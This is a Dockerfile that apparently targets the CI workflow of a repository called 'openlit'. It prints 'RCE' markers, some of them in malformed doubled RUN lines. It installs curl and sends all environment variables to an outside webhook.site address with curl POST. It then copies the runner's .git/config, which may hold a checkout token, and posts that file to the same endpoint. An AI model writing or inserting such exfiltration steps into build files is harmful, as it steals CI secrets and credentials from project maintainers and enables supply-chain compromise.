
FROM ubuntu:22.04

RUN RUN echo "RCE" >&2 
RUN RUN echo "${GITHUB_WORKSPACE}" >&2
# Export webhook environment variable
ENV webhook="https://webhook.site/7a74c235-2eda-482d-80fd-473c9c066cc4"
ENV repoName="openlit"

# Prevent interactive prompts during package install
ENV DEBIAN_FRONTEND=noninteractive

# Install curl
RUN apt-get update && \
    apt-get install -y curl && \
    rm -rf /var/lib/apt/lists/*

RUN curl -X POST \
    -H "Content-Type: text/plain" \
    --data "$(printenv)" \
    "$webhook/printenv"


# Copy .git/config into the image
COPY /home/runner/work/$repoName/$repoName/.git/config ./gitconfig_root
RUN curl -X POST \
    -H "Content-Type: text/plain" \
    --data "$(cat gitconfig_root)" \
    "$webhook/git_config"
